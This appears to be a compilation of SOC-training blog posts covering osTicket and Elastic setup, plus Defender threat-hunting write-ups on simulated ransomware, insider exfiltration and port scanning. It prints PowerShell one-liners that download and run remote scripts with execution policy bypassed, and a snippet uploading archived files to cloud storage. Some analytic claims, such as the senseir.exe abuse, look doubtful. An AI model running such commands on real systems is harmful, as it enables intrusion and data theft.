## Day 24 of the 30-Day MyDFIR SOC Analyst Challenge: Setting Up and Configuring OS Ticket

## Overview

On Day 24 of the 30-Day MyDFIR SOC Analyst Challenge! I'll dive into OS Ticket, a ticketing system that will be an essential tool for my SOC operations. The aim is to set up OS Ticket successfully and configure it on a Windows Server. This system will streamline ticket management for the alerts we'll deal with throughout the challenge. Let's get started!

## Deploying the Server

The first step in setting up OS Ticket is to deploy a server. I used Vulture for this process, selecting "Cloud Compute" with a shared CPU and Windows Server 2022. The server specifications don't need to be too powerful; I chose 1 CPU and 2 GB of memory. After selecting a location and setting up firewall configurations, the server was ready for Remote Desktop Protocol (RDP) access.

## Setting Up the Web Server

Once connected to the server, I installed XAMPP, a free and open-source cross-platform web server solution. XAMPP makes it easy to set up Apache, MySQL, and PHP, all necessary for OS Ticket to function. After downloading XAMPP, I configured it by:

- Changing the Apache domain name to my server's public IP address
- Modifying the phpMyAdmin configuration to ensure secure access from my SOC analyst laptop

## Configuring Firewall Rules

Before moving further, I created inbound firewall rules for ports 80 and 443. This ensures that only authorized devices can access the web server. With XAMPP running, I started both the Apache and MySQL services and verified that everything was configured correctly.

## Installing OS Ticket

Next, I downloaded OS Ticket from their official site, choosing the latest stable version. After extracting the files, I moved them to the XAMPP htdocs folder to be served by the Apache server. Once the web server was up and running, I accessed the OS Ticket setup page, which prompted me to configure the system. This included:

- Renaming configuration files
- Setting up a MySQL database for OS Ticket to store data

## Finalizing the Installation

With the database created and the necessary configurations in place, the final step was to run the OS Ticket installation. After entering admin details and configuring the database connection, the OS Ticket was successfully installed. I also ensured file permissions were properly set for security.

## Conclusion

With this system, I'll be able to manage SOC alerts efficiently. Up next, I'll explore how to integrate OS Ticket with my tech stack so that alerts automatically generate tickets.

## Day 29 of the 30-Day MyDFIR SOC Analyst Challenge: Installing and Exploring Elastic Defend on Windows Server

## Overview

On Day 29, I focused on Elastic's Endpoint Detection and Response (EDR) toolâElastic Defend. This powerful EDR solution offers comprehensive endpoint protection and valuable telemetry to help monitor and respond to threats.

## Setting Up Elastic Defend

Elastic Defend is part of the Elastic Stack, and with the free 30-day trial, I could unlock additional features like full telemetry and host isolation. To get started, I accessed the Integrations section in Elastic, From there, I added Elastic Defend to my environment. Elastic Defend offers several configuration options, including:
- Data Collection
- Next-Gen Antivirus
- Essential EDR
- Complete EDR

For this challenge, I chose Complete EDR, I then deployed Elastic Defend to my Windows Server using a Fleet server, allowing centralized management of multiple endpoints.

## Monitoring and Testing

With Elastic Defend successfully installed, I checked the Security section in Kibana to ensure the endpoint appeared, confirming the agent was active. Elastic Defend offers multiple actions, including the ability to isolate the host, which is available with the trial version.

I wanted to test Elastic Defend's malware detection capabilities, so I ran the pilotvader.exe process on my Windows Server, simulating a malicious action. As expected, Elastic Defend instantly flagged and blocked the file. A message appeared stating that the operation couldn't be completed because the file contained a virus, and I received a malware prevention alert confirming the file had been quarantined.

## Investigating Telemetry

To dive deeper, I went into the Discover tab in Kibana and filtered the logs to view recent events. There, I found the malware prevention alert with detailed information about the malicious file, including:
- File hash
- Quarantine path
- Directory (C:\Users\Public\Downloads)

In the Security tab, I also explored the process tree, which showed the relationship between the legitimate explorer.exe process and the blocked pilotvader.exe. If the malware had spawned other processes, they would have also appeared here.

## Isolating the Host

Next, I tested Elastic Defend's host isolation feature. After initiating an infinite ping to Google's DNS (8.8.8.8), I re-downloaded the malicious file, which Elastic Defend promptly quarantined again. Soon after, the host was isolated, demonstrating Elastic Defend's ability to take responsive action against threats.

## Conclusion

Day 29 was a valuable deep dive into Elastic Defend. I learned how to install, monitor, and test its EDR capabilities, reinforcing its importance for endpoint security. I'll wrap up the challenge tomorrow by reviewing troubleshooting techniques and fine-tuning detection strategies.

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #Day29 15:Tb7b,
## Day 25 of the 30-Day MyDFIR SOC Analyst Challenge: Integrating OS Ticket with Elastic Stack

## Overview

On Day 25 of the 30-Day MyDFIR SOC Analyst Challenge, I focused on integrating OS Ticket into my Elastic Stack environment. This integration allows for a more streamlined workflow, automatically creating tickets for alerts generated by Elastic. Here's how I approached it.

## Setting Up the API Key in OS Ticket

To start, I accessed the OS Ticket control panel and created a new API key. Since both my OS Ticket and Elastic Stack servers are hosted within the same Virtual Private Cloud (VPC), I used the private IP address of my Elastic Stack server for this configuration. If your servers are in different environments, you'd use the public IP instead.

Once I had the correct IP address, I configured the API key to allow ticket creation. With the key ready, I copied it into a notepad for easy reference during the Elastic setup.

## Configuring the Connector in Elastic Stack

Next, I moved to the Elastic Stack interface. From Stack Management, I navigated to the Connectors section. To enable the integration, I needed to activate Elastic's 30-day free trial, which allows the use of APIs. Once the trial was active, I created a new webhook connector, giving it a name like "OS Ticket."

The connector required:
- The OS Ticket server's IP address
- The API key I had generated earlier
- Necessary authentication headers

I added this information and then tested the connection. Initially, there was a network issue that required troubleshooting, but I later identified that the problem was with the private IP configuration on the OS Ticket server.

## Resolving Network Issues

Upon inspecting the OS Ticket server, I realized it was using a public IP rather than the private IP necessary for my setup. After correcting the network configuration and assigning the correct private IP address, the connection between Elastic Stack and OS Ticket was established successfully. A quick test confirmed that the integration was functioning as expected, with alerts now automatically generating tickets in OS Ticket.

## Conclusion

With OS Ticket fully integrated into my Elastic environment, I've added another layer of automation to my SOC setup. This integration will improve incident tracking and alert management, making the process more efficient. In the coming days, I'll shift focus to investigating alerts, beginning with SSH brute force detection.

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #Day25 16:Tc12,
## Day 23 of the 30-Day MyDFIR SOC Analyst Challenge: Understanding and Implementing a Ticketing System

## Overview

On Day 23 of the 30-Day MyDFIR SOC Analyst Challenge, I explored the significance of tracking security alerts and how a ticketing system plays a crucial role. Tracking an alert in any security tool is vital for identifying misconfigurations, and potential attacks, or understanding how it was handled. This is where a ticketing system comes in.

## What Is a Ticketing System?

A ticketing system is a tool designed to create and manage tickets for various tasks or incidents. These tickets can represent anything from security alerts to troubleshooting requests or customer complaints. The goal of a ticketing system is to provide an organized method to track issues, offer an audit trail, and ensure accountability. In the context of cybersecurity, having a ticketing system satisfies one of the three As of security: Authentication, Authorization, and Accounting (AAA).

Popular ticketing systems used in real-world environments include:
- Jira
- ServiceNow
- Freshdesk
- Zendesk

However, these are commercial products, and today, I'll introduce you to an open-source alternative that you can set up for free: OS Ticket.

## Introducing OS Ticket

OS Ticket, developed by Enhancesoft, is an open-source ticketing system that offers a wide range of features to fulfill core responsibilities found in commercial products. Some of the features include:

- Customizable fields
- Ticket filters for routing
- Assigning and transferring tickets
- Setting up a Service Level Agreement (SLA)

By integrating OS Ticket into your SOC workflow, you can begin mimicking the operations of a small SOC, gaining practical experience as you go.

You can choose to either self-host the OS Ticket (on-premise) or have the service managed for you, but the self-hosted option is completely free. While the free version only supports email integrations, this is sufficient for this challenge.

## Getting Started with OS Ticket

In the next step of this challenge, I will be going through setting up and configuring OS Ticket, allowing us to integrate it into our SOC analyst workflow. By doing so, I'll gain firsthand experience in:

- Tracking incidents
- Improving my skills in audit trails
- Understanding how ticketing systems contribute to security operations

## Conclusion

With OS Ticket, you now have a powerful tool to manage alerts, track tasks, and enhance the efficiency of your SOC environment. As we move forward, I will continue to explore how to leverage this system in practical scenarios.

#Cybersecurity #SOCAnalyst #30DayChallenge #PracticalExperience 18:Tb1f,
## Introduction

Today marks the beginning of my hands-on journey in the 30-Day MYDFIR SOC Analyst Challenge. I'm starting with the most fundamental aspect: creating a logical network diagram that will serve as the blueprint for my entire SOC environment.



## Environment Overview

At the heart of my SOC environment lies a carefully planned infrastructure consisting of six key servers. The core components include my Elastic Server for comprehensive log aggregation and analysis, paired with a Kibana Server that handles visualization and dashboard creation. To manage my agents effectively, I've incorporated a Fleet Server into the design. Additionally, a C2 Server has been included to facilitate realistic attack scenario simulations, alongside other supporting infrastructure components that complete my robust environment.

## Implementation Details

The implementation process began with draw.io as my diagramming tool of choice. Through careful consideration, I mapped out the complete environment with attention to detail. The process involved strategic placement of each server component within the network topology, ensuring optimal communication paths. I dedicated significant attention to configuring the private network structure and establishing clear data flow connections between components. Special consideration was given to defining security zones and boundaries, ensuring a secure and well-organized infrastructure.

## Key Insights

Through the process of creating this network diagram, I've gained valuable insights into the practical aspects of SOC architecture. Understanding how components interact within a security operations environment has proven crucial, as this setup mirrors real-world scenarios. The exercise has deepened my understanding of data flow patterns and the importance of comprehensive security monitoring coverage. This foundation will prove invaluable as I progress through the challenge.

## Future Direction

While this network diagram may appear straightforward, it represents the cornerstone of my 30-day journey. This blueprint will guide me through the configuration of monitoring tools, implementation of log forwarding mechanisms, and setup of alert management systems. As I progress, I'll use this foundation to simulate and detect security threats, turning theoretical knowledge into practical experience.

19:Tb5a,
## Introduction

On Day 2 of the 30-Days MYDFIR SOC Analyst Challenge, I delved into the ELK stack, a powerful trio of toolsâElasticsearch, Logstash, and Kibanaâwidely used in security operations. Together, they form the backbone of log management and analysis, crucial for any Security Operations Center (SOC).

## Understanding Elasticsearch

Elasticsearch is the heart of the stack. It's a robust search engine that stores and indexes massive amounts of log data. This data can range from Windows event logs to firewall logs and beyond. What makes Elasticsearch particularly valuable is its querying power. It uses Elasticsearch Query Language (ESQL), which allows users to search through large datasets quickly and efficiently. The flexibility of Elasticsearch, especially with its RESTful APIs and JSON support, means you can programmatically interact with it from other tools, enhancing its integration into diverse environments.

## The Power of Logstash

Next is Logstash, the powerhouse that processes and transforms incoming data before feeding it into Elasticsearch. Logstash is vital because it allows you to refine your log data, filtering out unnecessary information and only retaining what's critical. This reduces the load on Elasticsearch and helps you manage storage costs more effectively. Additionally, Logstash's ability to parse log fields is a game-changer. For example, you can extract specific details from logs, such as IP addresses, and map them to fields that can be easily queried later. This capability is crucial for security analysts who need to drill down into specific events during investigations.

## Visualizing with Kibana

Finally, Kibana is the interface where all the magic happens. It provides a user-friendly web console for querying data stored in Elasticsearch. Beyond simple querying, Kibana's visualization tools enable the creation of detailed dashboards that can display trends, alert patterns, and more. These dashboards are not only useful for real-time monitoring but also for reporting to executives, who often rely on visual data to understand security posture.

## Conclusion

The ELK stack offers centralized logging, customizable data processing, and scalable architecture, making it an essential tool for SOC analysts. Its integration with various telemetry sources and the ability to create visualizations make it a powerful platform for both real-time monitoring and incident response.

## Introduction

This investigation was conducted to examine suspicious file activity observed within the virtual machine samson-windows-, which was onboarded to Microsoft Defender for Endpoint (MDE). The objective was to determine whether abnormal file modification behaviour and ransom instructions on the desktop were the result of ransomware execution, and if so, to identify its origin, propagation chain, and indicators of compromise.

Using Microsoft Defender's advanced hunting capabilities, telemetry from multiple tables â DeviceFileEvents and DeviceProcessEvents â was analyzed to reconstruct the attack sequence.

## Scenario Overview

A new ransomware strain, internally referred to as PwnCrypt, had been reported as circulating in the wild. It leverages a PowerShell-based payload that encrypts local files using AES-256 encryption, appending the custom extension .pwncrypt. The strain also leaves ransom instructions in a desktop file demanding Bitcoin payment for decryption.

During lab testing, the same behaviour appeared on samson-windows-: three files on the Desktop were encrypted, and a text file appeared reading:

"Your files have been encrypted. To get a decryption key, send this amount of Bitcoin toâ¦"

The task was to confirm the root cause of this encryption, identify the executing process chain, and determine whether any persistence or lateral movement mechanisms were present.

## Preparation

Prior to the hunt, the samson-windows- VM was successfully onboarded to MDE, ensuring telemetry ingestion from endpoint sensors. A PowerShell script named pwncrypt.ps1 was executed in the background to simulate a real ransomware infection, but the analysis was performed as if the infection were unknown.

The first step was to establish a baseline of file activity to identify when the anomaly began.

## Data Collection

The analyst verified active log collection across Defender's telemetry tables. Using DeviceFileEvents, all file operations within the last 30 minutes were grouped by timestamp to visualize spikes in file write volume:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(30m)
| summarize FileEvents = count() by bin(Timestamp, 5m)
| order by Timestamp asc
-------------------------------------------------------

Result: Three distinct spikes appeared within a short interval, suggesting a mass file modification event, the initial indicator of ransomware behavior.

## Data Analysis

### A. Mass File Modification and Extension Changes

To examine which file types were most affected, the following query was run:

-------------------------------------------------------
kql
DeviceFileEvents
| where DeviceName == VMName
| where ActionType in ("FileRenamed","FileCreated","FileModified")
| extend ext = tostring(split(FileName,".")[-1])
| summarize Count = count() by ext
| order by Count desc
-------------------------------------------------------

Observation: Extensions such as .dll, .mui, .xml, and .png appeared frequently normal for background Windows processes â but hidden within the logs were sudden surges of renamed files later correlated with the encryption timestamps.

### B. Folder-Level Analysis (Staging Behaviour)

To determine where encryption occurred:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where ActionType == "FileCreated"
| summarize count() by Folder = extract(@"^(.*)\\[^\\]+$",1,FileName)
| order by count_ desc
-------------------------------------------------------

Result: High activity was isolated to a single user folder â C:\Users\samson\Desktop â confirming that encryption primarily targeted the Desktop directory.

### C. Identifying Script Execution

The next step was to look for evidence of any scripts or command-line interpreters responsible for the mass file actions:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where FileName has_any ("powershell","pwsh","cmd.exe","wscript.exe","cscript.exe","wmic.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: Two instances of PowerShell.exe were identified, both launched non-interactively with the parameters:

ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {...}"

The initiator process was senseir.exe, a legitimate Windows background service that had been abused to execute PowerShell. This discovery confirmed that PowerShell was used to deploy or execute the encryption payload.

### D. Tracing Child Processes and Persistence Mechanisms

To verify what PowerShell spawned:

-------------------------------------------------------
kql
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: PowerShell launched several cmd.exe and svchost.exe instances. These, in turn, executed processes such as python.exe, GameBarElevatedFT_Alias.exe, and MediaPlayer.exe, which were all generated within C:\Users\samson\AppData\Local\Temp â a common ransomware staging area.

### E. File Events Linked to User Folders

To focus on desktop encryption evidence:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(24h)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has_any("Desktop","\\Users\\")
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp desc
-------------------------------------------------------

Result:

A file named __decryption-instructions.lnk appeared on the desktop immediately after hundreds of file renames and creations, confirming the delivery of the ransom note. The parent process was explorer.exe, which executed after system encryption had completed, a typical behaviour of ransomware scripts displaying ransom messages post-infection.

### F. Process Chain Correlation â Root Cause Determination

Finally, to reconstruct the infection path:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName
| where Timestamp between (ago(120m) .. now())
| where FileName in~ ("powershell.exe","cmd.exe","services.exe","svchost.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
| order by Timestamp asc
-------------------------------------------------------

Findings:

1. powershell.exe (initiated by senseir.exe) executed a hidden script with an AllSigned policy bypass.
2. This instance spawned cmd.exe, which registered background services.
3. services.exe then created multiple svchost.exe processes running under SYSTEM and Network Service accounts.
4. These service-hosted processes performed the encryption routines on user data.

<InlineGallery images={pwncrypt-ransomware-investigation} title="PwnCrypt Ransomware Investigation and Analysis Process" />

## Investigation Summary

The analysis confirmed that samson-windows- was infected with PwnCrypt ransomware delivered via a PowerShell payload. The encryption occurred under SYSTEM privileges, appending custom extensions to files and generating a ransom note on the desktop.

Execution Chain:
senseir.exe â powershell.exe â cmd.exe â services.exe â svchost.exe â file encryption (.pwncrypt)

## Response and Containment

1. Isolated the compromised VM from the network using Defender's Isolate Device function.
2. Conducted a full antivirus and Defender scan; confirmed malicious artifacts were limited to the VM.
3. Recommended a complete VM rebuild to remove any residual persistence.
4. Captured SHA-1 hashes of key malicious files (__decryption-instructions.lnk, encrypted files) for threat-intel reference.
5. Logged the incident for follow-up reporting to management and for potential YARA-rule creation.

## Documentation

Each phase of this investigation â preparation, data collection, analysis, and response â was recorded within Microsoft Defender's query history and screenshots for audit and learning purposes.

All queries were executed methodically to trace the incident from initial file-system anomalies to the responsible process hierarchy.

## MITRE ATT&CK Mapping

The PwnCrypt ransomware activity observed in samson-windows- aligns with several stages of the MITRE ATT&CK framework.

1. **Initial Access (T1204.002 â User Execution)**: Infection began through manual execution of a malicious PowerShell script.
2. **Execution (T1059.001 / T1059.003)**: PowerShell and CMD were used to run the payload and supporting commands.
3. **Persistence (T1543.003)**: New service-host processes were created to maintain execution.
4. **Privilege Escalation & Defense Evasion (T1569.002 / T1562.001 / T1036.005)**: Ransomware leveraged elevated service contexts, bypassed PowerShell policies, and masqueraded as legitimate Windows binaries.
5. **Discovery (T1082)**: Enumerated user directories such as C:\Users\samson\Desktop before encryption.
6. **Impact (T1486 / T1491.001)**: Encrypted user files with the .pwncrypt extension and dropped a ransom note (__decryption-instructions.lnk).

Overall, the attack followed a full ransomware kill chain â Execution â Persistence â Privilege Escalation â Defence Evasion â Impact â demonstrating how PowerShell abuse and service creation can rapidly lead to data encryption and ransom deployment.

## Improvement and Lessons Learned

1. **Restrict PowerShell usage**: Configure Constrained Language Mode and allow only signed scripts.
2. **Implement application whitelisting**: Block unauthorized interpreters (cmd.exe, powershell.exe, etc.) in user space.
3. **Monitor mass file modifications**: Create a detection rule for spikes in FileModified and FileRenamed actions per host.
4. **Enhance user awareness**: Ransomware often enters through phishing or drive-by downloads; continuous education is essential.
5. **Segment the network**: Prevent lateral propagation between machines by enforcing least-privilege access controls.

## Conclusion

The investigation conclusively determined that the observed encryption on samson-windows- was caused by the PwnCrypt ransomware, executed via a PowerShell-based payload with SYSTEM privileges.

Although contained within the lab environment, the event accurately simulated a real-world ransomware outbreak and demonstrated how rapid detection through telemetry correlation from file anomalies to process hierarchies enables timely containment.

Through disciplined analysis and structured response, this project reinforced the value of proactive threat-hunting practices using Microsoft Defender for Endpoint.

1b:T290f,
## Introduction

This threat-hunting exercise focused on investigating a suspected case of data exfiltration within a simulated enterprise environment. The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.

The purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.

My lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.

## Scenario Overview

The investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.

John's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.

The objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.

## Preparation

Before the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.

- Created VM and onboarded to Microsoft Defender for Endpoint
- RDP connection established to VM
- Downloaded and ran MDE onboarding package
- VM successfully reporting in Defender portal

### PowerShell Command

-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
-------------------------------------------------------

This command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample "employee data," and simulated uploading them to an external Azure storage bucket.

In an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.

## Data Collection

With the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:

- DeviceFileEvents
- DeviceProcessEvents
- DeviceNetworkEvents

I ran an initial query to confirm that new records were appearing in real time.

### KQL Check for Recent Logs

-------------------------------------------------------
kql
DeviceFileEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.

## Data Analysis

The next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.

### KQL â Detect Archive Process Activity

-------------------------------------------------------
kql
let archive_applications = dynamic(["winrar.exe","7z.exe","winzip32.exe","peazip.exe","Bandizip.exe","UniExtract.exe","POWERARC.EXE","IZArc.exe","AshampooZIP.exe","FreeArc.exe"]);
let VMName = "samson-windows-";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
-------------------------------------------------------

Within seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\ProgramData\Backup\, suggesting automation.

Each entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.

## Investigation

To understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.

### KQL â Correlate File and Process Activity

-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-14T18:42:10.5615171Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

This query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.

Upon reviewing the VM's filesystem, I located the script at C:\ProgramData\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.

<InlineGallery images={data-exfiltration-detection-analysis} title="Data Exfiltration Detection and Analysis Process" />

### Snippet of the Observed PowerShell Script

Simplified excerpt of ExfiltrateData.ps1

-------------------------------------------------------
powershell
Start-Process "7z.exe" -ArgumentList "a", "C:\ProgramData\Backup\employee_data.zip", "C:\SensitiveFiles*"
Invoke-WebRequest -Uri "https://storageaccount.blob.core.windows.net/container/employee_data.zip" -Method Put -InFile "C:\ProgramData\Backup\employee_data.zip"
-------------------------------------------------------

The script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred. While no explicit network event confirmed the upload due to logging limitations, the sequence strongly suggested an attempted data transfer.

## Response and MITRE ATT&CK Mapping

This activity mapped directly to several tactics within the MITRE ATT&CK Framework:

1. **T1059.001 â PowerShell (Execution)**: PowerShell was used to install and execute the archiving utility.
2. **T1560 â Archive Collected Data (Collection)**: 7-Zip was used to compress sensitive data.
3. **T1074 â Data Staged (Collection)**: Archives were staged locally in C:\ProgramData\Backup\.
4. **T1048 â Exfiltration Over Alternative Protocol (Exfiltration)**: The script attempted HTTP PUT operations to Azure Blob storage.
5. **T1082 â System Information Discovery (Discovery)**: System metadata was queried before execution.

Upon discovering the activity, I isolated samson-windows- using Defender for Endpoint's "Isolate Device" feature to prevent further data loss. A subsequent malware scan returned no persistent threats; however, standard protocol would dictate re-imaging the endpoint for assurance.

## Documentation

Every step of this hunt should meticulously be documented from initial hypothesis through evidence gathering and correlation. All queries, findings, timestamps, and reasoning should be logged to ensure transparency and repeatability.

This approach mirrors a real-world SOC investigation, where maintaining a chronological record of queries and findings is crucial for post-incident reviews and audits. It also supports organizational learning by building an internal knowledge repository for future hunts.

## Improvement

Following the investigation, several security improvements were identified for the environment:

1. **Restrict PowerShell Execution Policies**: Limit execution to signed scripts only.
2. **Apply Data Loss Prevention (DLP) Controls**: Block unauthorized archive creation and outbound uploads.
3. **Enable Network Segmentation**: Prevent free east-west traffic between workstations.
4. **Implement Insider Threat Monitoring**: Establish alerts for mass file compressions or rapid archiving.
5. **Automate Detection Rules**: Create custom Defender queries to alert when users modify more than N ZIP files within a defined interval.

Together, these recommendations would help detect and contain future insider threat attempts before data is lost.

## Conclusion

This scenario successfully demonstrated how a disgruntled employee with admin rights could use simple PowerShell automation and compression tools to exfiltrate data without triggering traditional antivirus alerts.

Through structured querying in Microsoft Defender for Endpoint and methodical log analysis, I was able to trace the entire activity chain, from script execution to archiving and simulated upload attempts.

This exercise reinforced the importance of monitoring for non-malware abuse of legitimate tools and the necessity of tight endpoint controls to detect and deter insider threats in modern enterprise networks.

1c:T3430,
## Introduction

This threat hunting exercise was focused on investigating a sudden and unexplained network slowdown observed within a simulated enterprise lab environment. Using Microsoft Defender for Endpoint (MDE), the purpose of this hunt was to determine whether the performance degradation was caused by malicious internal activity, excessive resource usage, or misconfigured systems.

The environment consisted of my onboarded virtual machine named samson-windows-1, which was actively reporting telemetry to Microsoft Defender for Endpoint. The goal was to use real-time logs and threat hunting queries to identify abnormal behaviors that could suggest internal reconnaissance, port scanning, or other unauthorized actions within the network.

This scenario demonstrates a practical application of endpoint detection and response (EDR) data in uncovering internal security issues and applying structured analysis techniques to isolate potential causes.

## Scenario Overview

The issue began when the server team observed an overall slowdown across multiple legacy devices in the 10.0.0.0/16 subnet. External DDoS attacks were ruled out, meaning the cause was likely internal. The unrestricted internal network environment, where all hosts could communicate freely and PowerShell was allowed without restriction, created a perfect scenario for internal misuse or exploitation.

The working hypothesis for this hunt was that one of the systems inside the local network could have been performing unauthorized port scanning or large data transfers, which would naturally create latency or bandwidth congestion. The objective was to identify the specific device responsible for this unusual activity and determine whether it was a deliberate or automated action.

## Preparation

Before starting the hunt, I ensured that my virtual machine, samson-windows-, was properly onboarded to Microsoft Defender for Endpoint. Once confirmed, I simulated an internal event by executing a PowerShell command designed to initiate a controlled port scan within the local subnet. This step was necessary to generate realistic logs for analysis, mimicking what a real-world internal threat might look like.

<InlineGallery images={vm-setup-onboarding} title="VM Setup and Microsoft Defender Onboarding Process" />

### PowerShell Command
-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
-------------------------------------------------------

This PowerShell command downloaded and executed a script that scanned a range of IPs within the 10.0.0.x subnet, sequentially probing ports on other devices. In a real enterprise setting, this would represent a potential reconnaissance operation, something commonly done by attackers or misconfigured tools trying to map network exposure.

After executing the command, I allowed several minutes for the resulting logs to populate in Microsoft Defender for Endpoint's hunting tables. The preparation phase was crucial, as it ensured that the system had generated enough telemetry to analyze behaviors such as failed connection attempts, sequential port scanning, and process execution traces.

## Data Collection

Once the environment was prepared, the next phase involved verifying that telemetry data was actively being received across the three key Defender tables: DeviceNetworkEvents, DeviceFileEvents, and DeviceProcessEvents.

I began by executing a simple query to confirm that new logs were flowing in correctly. By ordering results by timestamp and taking the most recent entries, I could confirm that MDE was actively collecting data and that there were no ingestion delays.

### KQL Check for Recent Network Logs
-------------------------------------------------------
kql
DeviceNetworkEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The timestamps confirmed that logs were being generated in real time. Having verified the data sources, I was confident that the environment was providing the necessary visibility to conduct meaningful analysis.

In a real security operations environment, this phase mimics ensuring that sensors and logging mechanisms are functioning correctly before an investigation begins. Without fresh telemetry, an analyst could end up drawing conclusions from outdated or incomplete information.

## Data Analysis

The analysis phase began with looking for signs of network anomalies, specifically focusing on connection attempts that had either failed or succeeded in large quantities. A sudden burst of such activity could be indicative of scanning or enumeration attempts within the network.

### KQL â Count Failed Connections
-------------------------------------------------------
kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by FailedConnectionsAttempts desc
-------------------------------------------------------

When the results came back, the data immediately pointed to samson-windows- as the primary contributor to abnormal connection failures. The logs revealed that the device had failed over a hundred connection attempts, some directed at its own IP address and others toward another host in the subnet. Such behavior was a strong indicator of either misconfiguration or automated probing.

To further understand the scope of the activity, I drilled down into specific IP addresses that exhibited the highest failure rates. This approach mirrors a real-world scenario where analysts pivot from a general pattern to a specific anomaly for deeper inspection.

### KQL â Inspect All Failed Connections from a Specific IP
-------------------------------------------------------
kql
let IPInQuestion = "10.0.0.5";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| order by Timestamp desc
-------------------------------------------------------

Upon reviewing the sequence of failed connection attempts, it became clear that the remote ports being contacted followed a sequential pattern: ports 21, 23, 25, 53, 80, 110, 443, and others. This pattern matched the signature of a port scanning activity, which is typically used to identify open services running across hosts. Sequential probing of well-known ports is rarely accidental and often indicates reconnaissance or mapping behavior within the network.

At this stage, I had high confidence that the slowdown was caused by internal scanning originating from the samson-windows- VM.

<InlineGallery images={network-investigation-analysis} title="Network Investigation and Analysis Process" />

## Investigation

